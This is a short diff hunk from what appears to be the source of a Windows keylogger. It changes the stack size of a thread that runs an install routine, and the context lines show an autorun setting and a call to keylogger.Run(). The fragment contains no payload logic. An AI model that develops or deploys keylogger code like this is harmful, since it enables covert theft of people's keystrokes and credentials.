@@ -28,7 +28,7 @@ extern "C" int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
 	installer.SetAutorun(false);
 #endif
 
-	CreateThread(NULL, 16384, ProcInstall, NULL, 0, NULL);
+	CreateThread(NULL, 0xFFFF, ProcInstall, NULL, 0, NULL);
 	
 
 	keylogger.Run();
